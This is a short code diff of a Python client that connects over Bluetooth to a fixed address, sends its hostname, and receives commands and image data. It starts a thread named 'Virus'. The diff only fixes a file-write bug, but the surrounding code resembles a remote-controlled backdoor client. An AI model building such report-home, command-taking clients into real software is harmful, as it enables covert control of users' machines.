@@ -11,6 +11,7 @@ client.connect(("6c:2f:80:71:84:8b", 4))
 client.send(socket.gethostname().encode())
 th = threading.Thread(target=ClientUI.Virus,daemon=True)
 
+ima = b""
 try:
     while True:
         data = client.recv(1024)
@@ -18,8 +19,8 @@ try:
             break
 
         with open("received_image.png", "wb") as f:
-                f.write(image_data = b""+data)
-                
+            f.write(ima+data)
+
         dec = data.decode()
         print(dec)
         if dec == "1":
